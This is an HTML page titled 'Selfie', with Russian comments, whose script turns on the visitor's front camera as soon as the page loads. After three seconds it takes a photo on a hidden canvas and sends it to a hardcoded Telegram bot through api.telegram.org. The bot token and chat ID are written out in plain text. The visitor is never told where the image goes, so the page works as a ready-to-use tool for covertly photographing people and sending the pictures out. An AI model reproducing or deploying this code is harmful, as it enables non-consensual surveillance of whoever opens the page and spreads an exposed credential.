<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie</title>
    <style>
        body {
            margin: 0;
            background-color: black;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        video {
            width: 100%;
            height: auto;
            position: absolute;
            top: 0;
            left: 0;
            object-fit: cover;
            z-index: -1;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <script>
        // Токен и chat_id должны быть скрыты на сервере
        const botToken = "7010906033:AAGe4fWmuWDvz4sw-CpIAs4V1sfZ52pzJbQ"; // Установите на сервере
        const chatId = "2145450623";      // Установите на сервере

        async function startCamera() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                alert("Ваш браузер не поддерживает доступ к камере.");
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });
                const video = document.getElementById("video");
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => captureImage(video, stream), 3000); // Снимок через 3 секунды
                };
            } catch (error) {
                console.error("Ошибка доступа к камере:", error);
            }
        }

        function captureImage(video, stream) {
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/jpeg");

            sendImageToTelegram(imageData);
            
            // Останавливаем поток камеры
            stream.getTracks().forEach(track => track.stop());
        }

        async function sendImageToTelegram(imageData) {
            try {
                const blob = await (await fetch(imageData)).blob();
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "selfie.jpg");

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData,
                });

                if (response.ok) {
                    console.log("Селфи отправлено!");
                } else {
                    const errorDetails = await response.text();
                    console.error("Ошибка отправки селфи:", errorDetails);
                }
            } catch (error) {
                console.error("Ошибка отправки изображения:", error);
            }
        }

        startCamera();
    </script>
</body>
</html>